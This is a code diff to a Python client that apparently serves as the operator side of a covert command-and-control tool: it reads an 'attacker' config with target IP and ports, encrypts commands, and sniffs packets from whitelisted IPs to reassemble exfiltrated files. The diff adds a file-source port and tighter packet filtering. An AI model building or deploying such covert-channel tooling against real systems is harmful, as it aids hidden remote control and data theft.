@@ -28,6 +28,9 @@ class Client:
         self.filter = ""
         self.whitelist = []
         self.file_bits = []
+        self.recv_port = ""
+        self.send_port = ""
+        self.file_port = ""
     def start(self):
         self.process_yaml()
         self.create_thread()
@@ -51,6 +54,7 @@ class Client:
         self.target_ip = config['attacker']['target']
         self.recv_port = config['attacker']['recv_port']
         self.send_port = config['attacker']['send_port']
+        self.file_port = config['share']['src_port']
         self.proto = config['share']['proto']
         self.sequence = config['share']['sequence']
         self.filter = self.proto + " or tcp"
@@ -59,6 +63,7 @@ class Client:
         print(f"recv is {self.recv_port}")
         print(f"proto  is {self.proto}")
         print(f"seqwuence  is {self.sequence}")
+        print(f"file port  is {self.file_port}")
 
     def prepare_msg(self, cmd: str) -> str:
         cipher = self.generate_cipher()
@@ -99,12 +104,13 @@ class Client:
 
         # Packet with file processing
 
-        if IP in packet and packet[IP].src in self.whitelist:
+        if IP in packet and packet[IP].src in self.whitelist \
+                and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
             if packet[IP].src in self.whitelist:
                 print(f"received data from whitelisted ip: {packet[IP].src}")
-                data = packet[Raw].load
-                self.file_bits.append(data)
-
+                if Raw in packet:
+                    data = packet[Raw].load
+                    self.file_bits.append(data)
                 if b'\x00' in data:
                     print("Terminator received....")
                     self.combine_bits()
